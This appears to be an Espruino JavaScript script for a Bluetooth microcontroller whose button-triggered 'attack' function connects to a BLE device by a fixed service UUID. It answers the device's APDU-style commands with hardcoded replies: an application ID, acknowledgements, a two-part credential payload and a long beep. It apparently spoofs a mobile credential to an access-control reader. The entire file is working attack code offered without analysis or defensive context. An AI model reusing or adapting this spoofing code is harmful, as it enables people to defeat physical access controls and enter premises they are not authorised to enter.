var gatt;
var wrong = new Uint8Array([0xC0, 0x6A, 0x82]);
var aid = new Uint8Array([0xC0, 0x6F, 0x08, 0x85, 0x06, 0x02, 0x01, 0x40, 0x02, 0x01, 0x00, 0x90, 0x00]);
var ack = new Uint8Array([0xC0, 0x90, 0x00]);
var part1 = new Uint8Array([0x81, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x13, 0xA1, 0x11, 0xA1, 0x0F, 0x80, 0x01, 0x50, 0x81, 0x01, 0x01, 0x82]).buffer;
var part2 = new Uint8Array([0x40, 0x01, 0x01, 0x83, 0x01, 0x00, 0x84, 0x01, 0x01, 0x90, 0x00]).buffer;
var beep = new Uint8Array([0xC0, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x06, 0xA0, 0x04, 0x85, 0x02, 0x1F, 0x40, 0x90, 0x00]);
var longbeep = new Uint8Array([0xC0, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x06, 0xA0, 0x04, 0x85, 0x02, 0x7D, 0x00, 0x90, 0x00]);
var button = 0;
var hids = [];
var devs = [];
var id;
var vid;
var starttime;
var tscantime;
var endtime;
var e;
var count = 0;
var beeptime;
let serviceUuid = "00009800-0000-1000-8000-00177a000002";
let characteristicUuid = "0000aa00-0000-1000-8000-00177a000002";

let options = {
    filters: [{
        services: [serviceUuid]
    }],
};

function attack() {
    var count = 0;
    NRF.requestDevice(options)
        .then(function(device) {
            LED3.set();
            device.on('gattserverdisconnected', function(reason) {
                digitalWrite([LED3, LED2, LED1], 0);
                console.log("Disconnected ", reason);
            });
            return device.gatt.connect();
        })
        .then(function(server) {
            gatt = server;
            return server.getPrimaryService(serviceUuid);
        })
        .then(function(service) {
            return service.getCharacteristic(characteristicUuid);
        })
        .then(function(characteristic) {
            characteristic.on('characteristicvaluechanged', function(event) {
                const byteArray = new Uint8Array(event.target.value.buffer);
                const hexParts = [];
                var senthex = '';
                for (i = 0; i < byteArray.length; i++) {
                    const hex = byteArray[i].toString(16);
                    hexParts.push(hex);
                    senthex += hex;
                }
                hexParts.join('');
                if (senthex === "c00a440aa00038202f0110") {
                    console.log("AID:" + senthex);
                    characteristic.writeValue(aid);
                } else if (senthex.match("c00a440aa000")) {
                    console.log("WRONG:" + senthex);
                    characteristic.writeValue(wrong);
                } else if (senthex.match("c00da")) {
                    console.log("ACK:" + senthex);
                    characteristic.writeValue(ack);
                } else if (senthex === 'c00ca0000' && count == 0) {
                    count = (count + 1);
                    console.log("PART1:" + senthex);
                    characteristic.writeValue(part1);
                    setTimeout(function() {
                        console.log("PART2:" + senthex);
                        characteristic.writeValue(part2);
                    }, 250);
                } else if (senthex.match("c00da73000")) {
                    console.log("ACK2:" + senthex);
                    characteristic.writeValue(ack);
                } else if (count == 1 && senthex === 'c00ca0000') {
                    LED3.reset();
                    LED2.set();
                    count = (count + 1);
                    characteristic.writeValue(longbeep);
                    console.log("BEEP:" + senthex);
                    try {
                        gatt.disconnect();
                    } catch (e) {}
                } else {
                    LED2.reset();
                    LED3.reset();
                    digitalPulse(LED1, 1, 2500);
                    console.log("Failed with " + senthex);
                    gatt.disconnect();
                }
            });
            return characteristic.startNotifications();
        }).catch(function(e) {
            LED2.reset();
            LED3.reset();
            digitalPulse(LED1, 1, 2500);
            console.log("ERROR", e);
        });
}

setWatch(attack, BTN, {
    edge: "rising",
    debounce: 50,
    repeat: true
});
